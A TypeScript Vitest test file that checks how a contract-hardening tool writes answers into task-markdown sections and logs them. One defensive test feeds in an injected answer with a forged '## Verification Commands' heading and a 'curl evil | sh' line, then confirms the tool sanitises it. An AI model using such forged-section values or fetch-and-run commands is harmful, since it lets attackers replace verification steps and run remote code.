import { describe, it, expect } from 'vitest';
import { applyResolution, HardenResolutionError } from '../../src/core/harden-resolve.js';
import { analyzeContract, hasBlockingSoftSpots, type SoftSpotType } from '../../src/core/harden.js';

const base = ['- Task type: feature',
  '## Files or Areas Not to Touch', '- None recorded yet.',
  '## Acceptance Criteria', '- `npm test` passes'].join('\n');

describe('applyResolution', () => {
  it('writes the answer into the section and logs it', () => {
    const id = analyzeContract(base).find((s) => s.type === 'unbounded-scope')!.id;
    const out = applyResolution(base, id, 'Published release tarballs');
    expect(out).toContain('- Published release tarballs');
    expect(out).not.toContain('None recorded yet.');
    expect(out).toContain('## Hardening Log');
    expect(out).toContain(`- [${id}] Published release tarballs`);
  });

  it('throws on an unknown spot id', () => {
    expect(() => applyResolution(base, 'placeholder:nope:0', 'x')).toThrow(HardenResolutionError);
  });

  it('exposes the HARDEN_UNKNOWN_SPOT code on the error', () => {
    expect(new HardenResolutionError('x').code).toBe('HARDEN_UNKNOWN_SPOT');
    let caught: unknown;
    try {
      applyResolution(base, 'placeholder:nope:0', 'x');
    } catch (error) {
      caught = error;
    }
    expect((caught as HardenResolutionError).code).toBe('HARDEN_UNKNOWN_SPOT');
  });
});

// A verifiable answer that satisfies PROOF_HINTS (backtick command) so that a
// resolved acceptance line does not itself re-trigger an untestable spot.
const PROOF_ANSWER = '`npm test` passes';

interface Case {
  name: string;
  type: SoftSpotType;
  markdown: string;
  answer: string;
  blocking: boolean;
}

const cases: Case[] = [
  {
    name: 'placeholder on a paragraph section (Problem Statement)',
    type: 'placeholder',
    markdown: [
      '## Problem Statement',
      'Describe the problem this task should solve.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n'),
    answer: 'The release CLI drops evidence when the report is missing.',
    blocking: true,
  },
  {
    name: 'placeholder on a list section (Verification Commands)',
    type: 'placeholder',
    markdown: [
      '## Verification Commands',
      '- No verification command recorded.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n'),
    answer: 'npm test',
    blocking: true,
  },
  {
    name: 'unbounded-scope on an empty Files-Not-To-Touch',
    type: 'unbounded-scope',
    markdown: ['## Files or Areas Not to Touch', '- None recorded yet.'].join('\n'),
    answer: 'Published release tarballs',
    blocking: true,
  },
  {
    name: 'unstated-assumption on empty Assumptions for a feature task',
    type: 'unstated-assumption',
    markdown: [
      '- Task type: feature',
      '## Assumptions',
      '- None recorded yet.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n'),
    answer: 'The snapshot primitive stays Vitest.',
    blocking: false,
  },
  {
    name: 'untestable-acceptance on a vague criterion',
    type: 'untestable-acceptance',
    markdown: [
      '## Acceptance Criteria',
      '- The feature works well',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n'),
    answer: PROOF_ANSWER,
    blocking: true,
  },
  {
    name: 'contradiction between acceptance and non-goals',
    type: 'contradiction',
    markdown: [
      '## Non-Goals',
      '- No caching layer',
      '## Acceptance Criteria',
      '- Caching returns 200 within 50ms',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n'),
    // Deliberately shares no significant token with the Non-Goals line and
    // carries a proof hint, so it re-triggers neither contradiction nor
    // untestable-acceptance.
    answer: '`npm test` returns exit 0',
    blocking: true,
  },
];

describe('applyResolution convergence matrix', () => {
  for (const testCase of cases) {
    it(`converges the ${testCase.name}`, () => {
      const before = analyzeContract(testCase.markdown);
      const spot = before.find((s) => s.type === testCase.type);
      expect(spot, `expected a ${testCase.type} spot in fixture`).toBeDefined();

      const result = applyResolution(testCase.markdown, spot!.id, testCase.answer);
      const after = analyzeContract(result);

      // The exact spot we resolved must be gone.
      expect(after.some((s) => s.id === spot!.id)).toBe(false);
      // The Hardening Log entry is recorded.
      expect(result).toContain(`- [${spot!.id}] ${testCase.answer}`);

      if (testCase.blocking) {
        // This was the only blocking spot in the fixture, so no blocking
        // spots should remain.
        const blockingBefore = before.filter((s) => s.severity === 'blocking');
        expect(blockingBefore).toHaveLength(1);
        expect(hasBlockingSoftSpots(after)).toBe(false);
      }
    });
  }
});

describe('batched sequential placeholder resolution (FIX 2 — stable ids)', () => {
  it('resolves two placeholder spots in sequence without throwing', () => {
    const markdown = [
      '## Problem Statement',
      'Describe the problem this task should solve.',
      '## Desired Outcome',
      'Describe the concrete result expected from this task.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n');

    const spots = analyzeContract(markdown).filter((s) => s.type === 'placeholder');
    expect(spots).toHaveLength(2);
    const [first, second] = spots;

    const afterFirst = applyResolution(markdown, first.id, 'A concrete problem statement.');
    // The second id (captured up front) must still resolve on the updated
    // contract; with unstable ordinals this would throw.
    const afterSecond = applyResolution(afterFirst, second.id, 'A concrete desired outcome.');

    expect(analyzeContract(afterSecond).some((s) => s.type === 'placeholder')).toBe(false);
  });
});

describe('`###` subheading is a section boundary, not corruptible content (FIX 1)', () => {
  it('does not treat a `### Notes` subheading following Acceptance Criteria as an untestable-acceptance line, and never overwrites it', () => {
    const markdown = [
      '## Acceptance Criteria',
      '- The feature works well',
      '### Notes',
      'Some prose about scope that must survive untouched.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n');

    // Only the real criterion line should be flagged — the `### Notes`
    // subheading and its prose must not leak into the Acceptance Criteria
    // body and be misidentified as untestable-acceptance spots.
    const spots = analyzeContract(markdown).filter((s) => s.type === 'untestable-acceptance');
    expect(spots).toHaveLength(1);

    const result = applyResolution(markdown, spots[0].id, PROOF_ANSWER);

    // The subheading and its prose must be preserved verbatim — a leaky
    // section boundary would let replaceAcceptanceLine overwrite one of them.
    expect(result).toContain('### Notes');
    expect(result).toContain('Some prose about scope that must survive untouched.');
    expect(result).toContain(`- ${PROOF_ANSWER}`);
  });
});

describe('`###` subheading is a section boundary for appended (not replaced) entries (FIX G)', () => {
  it('appends a second Hardening Log entry before a `### Notes` subheading, and leaves the subheading untouched', () => {
    // The Hardening Log already has one real (non-placeholder) entry, so
    // resolving another spot exercises appendToSection's *push* path (not
    // the in-place placeholder replacement, which is a no-op either way).
    // A `### Notes` subheading follows within the same nominal section —
    // the old `/^##\s+/` terminator does not match `### Notes` and would
    // let the new entry leak past it.
    const markdown = [
      '## Files or Areas Not to Touch',
      '- None recorded yet.',
      '## Hardening Log',
      '- [seed:entry:0] Pre-existing hardening note.',
      '### Notes',
      'Some prose about scope that must survive untouched.',
      '## Acceptance Criteria',
      `- ${PROOF_ANSWER}`,
    ].join('\n');

    const spot = analyzeContract(markdown).find((s) => s.type === 'unbounded-scope');
    expect(spot, 'expected an unbounded-scope spot in fixture').toBeDefined();

    const result = applyResolution(markdown, spot!.id, 'Published release tarballs');

    const seedIndex = result.indexOf('- [seed:entry:0] Pre-existing hardening note.');
    const notesIndex = result.indexOf('### Notes');
    const newEntryIndex = result.indexOf(`- [${spot!.id}] Published release tarballs`);

    expect(seedIndex).toBeGreaterThan(-1);
    expect(notesIndex).toBeGreaterThan(-1);
    expect(newEntryIndex).toBeGreaterThan(-1);
    // The new entry must land between the existing Hardening Log entry and
    // the `### Notes` subheading — a leaky terminator would instead push it
    // after `### Notes`'s prose.
    expect(newEntryIndex).toBeGreaterThan(seedIndex);
    expect(newEntryIndex).toBeLessThan(notesIndex);

    // The subheading and its prose must be preserved verbatim.
    expect(result).toContain('### Notes');
    expect(result).toContain('Some prose about scope that must survive untouched.');
    expect(analyzeContract(result).some((s) => s.type === 'unbounded-scope')).toBe(false);
  });
});

// FIX S1 (command injection / verification bypass): an --answer containing
// newlines plus a forged `## Verification Commands` heading must not be able
// to splice a second, attacker-controlled section into the contract.
// `parseTaskSectionCommands` in verification.ts takes the FIRST matching
// `## Verification Commands` block, so an injected heading earlier in the
// document would silently replace the real verification commands with the
// attacker's (e.g. `curl evil | sh`).
describe('applyResolution sanitizes the answer before writing (FIX S1)', () => {
  const markdown = [
    '## Files or Areas Not to Touch',
    '- None recorded yet.',
    '## Verification Commands',
    '- npm test',
  ].join('\n');

  it('collapses newlines and neutralizes a forged heading so no second section is created', () => {
    const spot = analyzeContract(markdown).find((s) => s.type === 'unbounded-scope')!;
    const malicious = 'x\n\n## Verification Commands\n- curl evil | sh';

    const result = applyResolution(markdown, spot.id, malicious);

    // Exactly one `## Verification Commands` heading survives — the
    // original one. The injected text did not forge a second heading.
    const headingMatches = result.match(/^## Verification Commands\s*$/gm) ?? [];
    expect(headingMatches).toHaveLength(1);

    // The original verification section (and its real command) is intact.
    expect(result).toContain('## Verification Commands\n- npm test');

    // The injected payload is inert: folded onto a single escaped line, not
    // a live markdown heading or its own list item.
    expect(result).not.toMatch(/^- curl evil \| sh\s*$/m);
    expect(result).not.toMatch(/\n## Verification Commands\n- curl evil/);

    // The soft spot the attacker answer was ostensibly resolving is gone —
    // but only because the sanitized, single-line answer was written, not
    // because a forged section changed contract structure.
    expect(analyzeContract(result).some((s) => s.id === spot.id)).toBe(false);
  });

  it('leaves ordinary answers (paths, plain prose) readable — only markdown-structural chars are escaped', () => {
    const spot = analyzeContract(markdown).find((s) => s.type === 'unbounded-scope')!;
    const result = applyResolution(markdown, spot.id, 'node_modules/ and src/auth');
    // `_` is markdown-structural (emphasis), so escapeMarkdownProse escapes
    // it to keep it literal; the path itself is preserved verbatim
    // otherwise, and `/` is not touched.
    expect(result).toContain('- node\\_modules/ and src/auth');
  });
});

// FIX M1 (false audit trail): a resolution that does not actually clear the
// soft spot must throw instead of being recorded as resolved.
describe('applyResolution rejects non-converging resolutions (FIX M1)', () => {
  const markdown = [
    '## Acceptance Criteria',
    '- The feature works well',
    '## Files or Areas Not to Touch',
    '- src/legacy',
  ].join('\n');

  it('throws when the answer still has no checkable predicate', () => {
    const spot = analyzeContract(markdown).find((s) => s.type === 'untestable-acceptance')!;
    expect(() => applyResolution(markdown, spot.id, 'it just works, trust me')).toThrow(
      HardenResolutionError,
    );
    expect(() => applyResolution(markdown, spot.id, 'it just works, trust me')).toThrow(
      /did not clear soft spot/i,
    );
    // Nothing should be recorded for a non-convergent answer: re-running
    // analysis on the original (untouched) markdown still finds the spot.
    expect(analyzeContract(markdown).some((s) => s.id === spot.id)).toBe(true);
  });

  it('succeeds and clears the spot when the answer has a checkable predicate', () => {
    const spot = analyzeContract(markdown).find((s) => s.type === 'untestable-acceptance')!;
    const result = applyResolution(markdown, spot.id, '`npm test -- x` passes');
    expect(analyzeContract(result).some((s) => s.id === spot.id)).toBe(false);
    expect(result).toContain('- `npm test -- x` passes');
  });
});

describe('section boundary is fence-aware, and resolution never corrupts a fence (FIX F2)', () => {
  it('resolves the real trailing untestable-acceptance criterion after a fenced snippet without touching the fence', () => {
    const markdown = [
      '## Acceptance Criteria',
      '- `npm test` passes',
      '- Example response for `GET /status` is shown below:',
      '```',
      '### Example heading',
      'GET /status returns 200',
      '```',
      '- The feature works well',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n');

    const spot = analyzeContract(markdown)
      .filter((s) => s.type === 'untestable-acceptance')
      .find((s) => s.question.includes('The feature works well'));
    expect(spot, 'expected the real trailing criterion to be flagged').toBeDefined();

    const result = applyResolution(markdown, spot!.id, PROOF_ANSWER);

    // The fence and its pasted content — including the `### Example
    // heading` line that used to wrongly terminate the section — survive
    // untouched; a broken ordinal count could otherwise land the in-place
    // replacement on a fence delimiter and corrupt it.
    expect(result).toContain('```\n### Example heading\nGET /status returns 200\n```');
    // The real trailing criterion was replaced in place.
    expect(result).toContain(`- ${PROOF_ANSWER}`);
    expect(result).not.toContain('- The feature works well');
    expect(analyzeContract(result).some((s) => s.id === spot!.id)).toBe(false);
  });
});

describe('placeholder resolution with non-canonical spacing (FIX A)', () => {
  it('detects and resolves a placeholder line with extra internal spaces', () => {
    // A placeholder with double space (non-canonical) should still be detected
    // and resolvable, because findPlaceholderTaskSections normalizes spacing.
    const markdown = [
      '## Problem Statement',
      'Describe the problem this task  should solve.',
      '## Files or Areas Not to Touch',
      '- src/legacy',
    ].join('\n');

    const spots = analyzeContract(markdown);
    const placeholder = spots.find((s) => s.type === 'placeholder');
    expect(placeholder, 'expected to detect placeholder with extra spacing').toBeDefined();

    // applyResolution should succeed without throwing
    const result = applyResolution(markdown, placeholder!.id, 'A problem statement.');
    expect(result).toContain('A problem statement.');
    expect(result).not.toContain('should  solve');

    // After resolution, no placeholder spot should remain
    expect(analyzeContract(result).some((s) => s.type === 'placeholder')).toBe(false);
  });
});
